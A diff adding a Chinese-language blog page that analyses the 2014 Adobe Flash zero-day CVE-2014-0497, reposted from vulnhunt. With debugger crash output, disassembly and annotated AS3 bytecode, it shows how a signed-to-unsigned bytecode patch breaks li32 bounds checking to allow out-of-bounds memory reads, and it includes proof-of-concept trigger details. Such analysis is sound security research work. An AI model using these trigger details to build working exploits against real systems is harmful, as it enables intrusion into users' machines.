@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Adobe Flash CVE-2014-0497漏洞分析</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>Adobe Flash CVE-2014-0497漏洞分析</h2>
+	<p class="meta">2014-02-24</p>
+
+	<div class="post">
+	        <p></p>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline">春节期间Adobe Flash播放器被爆出0Day漏洞(编号：CVE-2014-0497)，该漏洞危害Flash 12.0.0.38以及之前的版本。Adobe官方已推出修复补丁。</p>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline">该漏洞是由于SWF中嵌入AS3代码解析错误。在分析的样本文件中，通过AS3 Sorcerer查看样本文件中的AS3代码，AS3中利用了li32与ByteArray结合实现快速的内存读取。根据Adobe的官方解释，li32函数的参数是一个ByteArray数组的索引值，这个函数可以将ByteArray中的数据快速存取到变量中，但是这个索引值的大小必须在0到ByteArray的数组长度之间，意味着这个函数会进行边界检查，而在生成数组边界检查代码的时候会根据我们构造的数据判断是否为无符号数，这里我们构造了恶意数据使其生成了无符号数的比较代码。</p>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline">在生成有符号数比较代码时会生成“sub esi,4”这条指令，这条指令主要是将数组长度减去4，防止从byte数组读取int数据时发生缓冲区溢出，而生成无符号数比较代码时，会生成“sub esi,80000004h”，esi中本来存储的是数组长度0×1000，经过这条指令后，变成一个负数，即很大的无符号数。进行无符号匹配跳转时，索引值比长度大的时会跳转到数组越界处理程序，而现在长度远比索引值大，所以可以继续往下执行，因此就会读取到数组外的数据，发生溢出。</p>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">Crash:</strong></p>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline"></strong></p>
+<div class="line number1 index0 alt2" style="white-space: normal; font-size: 1em !important; line-height: 1.1em !important; margin: 0px !important; padding: 0px 1em !important; border: 0px !important; vertical-align: baseline !important; float: none !important; height: auto !important; overflow: visible !important; width: auto !important;" dir="ltr">
+<pre class="prettyprint lang-html">(17c.5e4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=8357e000 ebx=0357e000 ecx=02bcbaf0 edx=80002100 esi=80000000 edi=02843fc8
+eip=02e5f45e esp=0012e728 ebp=0012e8c0 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00250286
+02e5f45e 8b0410          mov     eax,dword ptr [eax+edx] ds:0023:03580100=????????</pre>
+</div>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">数组中的内容:</strong></p>
+<pre class="prettyprint lang-plain">06cc4000  6f6d336d 00007972 00000000 00000000  m3mory..........
+06cc4010  00000000 00000000 00000000 00000000  ................
+06cc4020  00000000 00000000 00000000 00000000  ................
+06cc4030  00000000 00000000 00000000 00000000  ................
+06cc4040  00000000 00000000 00000000 00000000  ................
+06cc4050  00000000 00000000 00000000 00000000  ................
+06cc4060  00000000 00000000 00000000 00000000  ................
+06cc4070  00000000 00000000 00000000 00000000  ................</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline">在漏洞发生的时候是从eax数组中读取指定索引的数据，数据区不可访问出错。</p>
+<pre class="prettyprint lang-plain">0:000&gt; kv
+ChildEBP RetAddr  Args to Child
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+0012e8c0 009d9231 066db910 00000000 0012e910 0x682cefc
+0012e8e4 009d9f85 066db910 00000000 0012e910 Flash_player_12_0!IAEModule_IAEKernel_UnloadModule+0x10beb1
+0012e938 009d9a1e 066db910 00000000 0012e98c Flash_player_12_0!IAEModule_IAEKernel_UnloadModule+0x10cc05
+0012e974 009c26fd 00000000 0012e98c 06663180 Flash_player_12_0!IAEModule_IAEKernel_UnloadModule+0x10c69e
+0012ea20 009c45be 01a23020 0191c1f0 00000000 Flash_player_12_0!IAEModule_IAEKernel_UnloadModule+0xf537d
+0012ea4c 0048ced4 018fb060 00000001 018fb060 Flash_player_12_0!IAEModule_IAEKernel_UnloadModule+0xf723e
+0012eae8 0048d32b 018fb060 0012ecc4 00000000 Flash_player_12_0!WinMainSandboxed+0x89be8
+0012eb18 0048dd4c 00000008 00000000 0012ecc4 Flash_player_12_0!WinMainSandboxed+0x8a03f
+0012ec7c 00426f3b 018fd0a0 07ffffff 07ffffff Flash_player_12_0!WinMainSandboxed+0x8aa60
+00000000 00000000 00000000 00000000 00000000 Flash_player_12_0!WinMainSandboxed+0x23c4f</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">进行栈回溯</strong></p>
+<pre class="prettyprint lang-plain">009d9220 8b4d10          mov     ecx,dword ptr [ebp+10h]
+009d9223 8b5008          mov     edx,dword ptr [eax+8]
+009d9226 8b5204          mov     edx,dword ptr [edx+4]
+009d9229 51              push    ecx
+009d922a 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
+009d922d 51              push    ecx
+009d922e 50              push    eax
+009d922f ffd2            call    edx  //调用动态生成的代码。
+009d9231 83c40c          add     esp,0Ch</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline">在解析我们编写的AS3的代码TestExploit()之前，Flash还会解析其他的代码，如function script0$init():*，function script0$init():*，在将这些代码都解析完成之后，才会进入TestExploit()。<br>因此会多次进入动态生成的代码区，研究人员可以记录每次EDX，当发生崩溃后，进入最后一次的EDX代码区，对其进行分析。在研究漏洞的过程中，flash的计时器以及本身的机制会对结果造成很大的影响，所以在调试的时候要快速的找到断点，溢出的位置与EDX数据的偏移是一致的，可以在进入到虚拟代码时，对偏移地址下断点，这样就可以快速跟踪到溢出地点。<br><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">字节码:</strong></p>
+<pre class="prettyprint lang-plain">6    constructsuper (0)
+8    pushuint       2147483648  // 0x80000000  //被修改的字节码将double类型修改成Uint类型。
+10   setlocal1
+11   findpropstrict flash.utils::ByteArray //nameIndex = 2
+13   constructprop  flash.utils::ByteArray (0) //nameIndex = 2
+16   coerce         flash.utils::ByteArray //nameIndex = 2
+18   setlocal2
+19   getlocal2
+20   pushshort      4096
+23   setproperty    length //nameIndex = 7
+25   getlocal2
+26   pushstring     "m3mory"  //stringIndex = 18  //数组赋值
+28   callpropvoid   writeUTFBytes (1) //nameIndex = 8
+31   getlex         flash.system::ApplicationDomain //nameIndex = 13
+33   getproperty    currentDomain //nameIndex = 5
+35   getlocal2
+36   setproperty    domainMemory //nameIndex = 6
+38   getlocal1
+39   pushint        2147475196  // 0x7fffdefc   该数据与变量相减取得索引压栈传递给li32
+41   subtract
+42   li32                  //在该函数中对上面传过来的索引进行比较发生了溢出
+43   setlocal3
+44   getlocal1
+45   pushshort      8448
+48   add
+49   li32
+50   pushint        305419896   // 0x12345678
+52   ifne           L1</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">溢出点汇编代码</strong></p>
+<pre class="prettyprint lang-plain">0682ced3 8b5014          mov     edx,dword ptr [eax+14h]  //数组的索引地址
+0682ced6 8b7018          mov     esi,dword ptr [eax+18h]   //数组的大小
+0682ced9 8d8300210080    lea     eax,[ebx-7*******h]   //ebx=_local4,eax为构造的数据做为读取数组的索引值。
+0682cedf 81ee04000080    sub     esi,80000004h   //因为是从byte中读取int32数据，所以最后索引地址只能是数组长度-4，否则会造成溢出，但就是在做边界检查的时候发生了溢出，这里漏洞利用人员构造了特殊的结构，使这里不是减4，而是减80000004，这样esi就变成了负数，下面进行边界检查是用的无符号数的比较。
+0682cee5 3bc6            cmp     eax,esi    //比较数组长度和要读取索引值
+0682cee7 8bb5dcfeffff    mov     esi,dword ptr [ebp-124h]
+0682ceed 0f878b000000    ja      0682cf7e     //若eax&gt;esi跳转，如果小于则不跳转，原eax&gt;esi，经过上面的减法之后造成了整数向下溢出，再进行无符号的匹配。如果正常跳转将会进入到，数组越界处理程序。
+0682cef3 8bc2            mov     eax,edx    //eax存储数组索引
+0682cef5 03c3            add     eax,ebx      //ebx是poc中构造的值
+0682cef7 bb00210080      mov     ebx,80002100h  //将地址偏移赋值给ebx
+0682cefc 8b0418          mov     eax,dword ptr [eax+ebx] ds:0023:06cd4000=????????
+//读取数据是，在此由于我们构造的POC中暑给了足够大的距离使每次读取数据都可以发生溢出。
+0682ceff 894588          mov     dword ptr [ebp-78h],eax
+正常AS3生成的汇编代码
+06b39f0e 8b45c8          mov     eax,dword ptr [ebp-38h]
+06b39f11 8b5314          mov     edx,dword ptr [ebx+14h]
+06b39f14 8b7318          mov     esi,dword ptr [ebx+18h]
+06b39f17 8d9805210080    lea     ebx,[eax-7FFFDEFBh]
+06b39f1d 8bfe            mov     edi,esi
+06b39f1f 83ef04          sub     edi,4
+06b39f22 3bdf            cmp     ebx,edi
+06b39f24 7768            ja      06b39f8e
+ 
+06b39f26 8bda            mov     ebx,edx
+06b39f28 03d8            add     ebx,eax
+06b39f2a bf05210080      mov     edi,80002105h
+06b39f2f 8b1c3b          mov     ebx,dword ptr [ebx+edi]</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline">正常AS3生成的汇编代码</strong></p>
+<pre class="prettyprint lang-plain">06b39f0e 8b45c8          mov     eax,dword ptr [ebp-38h]
+06b39f11 8b5314          mov     edx,dword ptr [ebx+14h]
+06b39f14 8b7318          mov     esi,dword ptr [ebx+18h]
+06b39f17 8d9805210080    lea     ebx,[eax-7FFFDEFBh]
+06b39f1d 8bfe            mov     edi,esi
+06b39f1f 83ef04          sub     edi,4      //此处为减4而不是减80000004
+06b39f22 3bdf            cmp     ebx,edi
+06b39f24 7768            ja      06b39f8e
+ 
+06b39f26 8bda            mov     ebx,edx
+06b39f28 03d8            add     ebx,eax
+06b39f2a bf05210080      mov     edi,80002105h
+06b39f2f 8b1c3b          mov     ebx,dword ptr [ebx+edi]</pre>
+<p style="margin-top: 0px;margin-bottom: 15px;padding: 0px;border: 0px;vertical-align: baseline"><strong style="margin: 0px;padding: 0px;border: 0px;vertical-align: baseline"><br>该漏洞的成因是因为，Flash在对无符号数和有符号的数据访问控制出错，导致了有符号整数向下溢漏洞。在研究POC的过程中可以使用，字节码修改工具修改swf文件的字节码，将一个有符号数修改成无符号数，那么在生成代码的时候就会生成错误代码。</strong><br></p>
+<pre class="prettyprint lang-plain">正常的AS3文件生成字节码是：
+pushdouble          2147483648  // 0x80000000
+修改后的字节码
+pushuint        2147483648  // 0x80000000</pre>
+<p>by Jason &amp;&amp; hcl of code audit labs of vulnhunt.com</p>
+<p><span style="color: rgb(0, 176, 80);">via/[</span><a href="http://blog.vulnhunt.com/index.php/2014/02/20/cve-2014-0497_analysis/" target="_blank" title="" data_ue_src="http://blog.vulnhunt.com/index.php/2014/02/20/cve-2014-0497_analysis/" style="color: rgb(0, 176, 80); text-decoration: underline;"><span style="color: rgb(0, 176, 80);">vulnhunt</span></a><span style="color: rgb(0, 176, 80);">]</span></p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
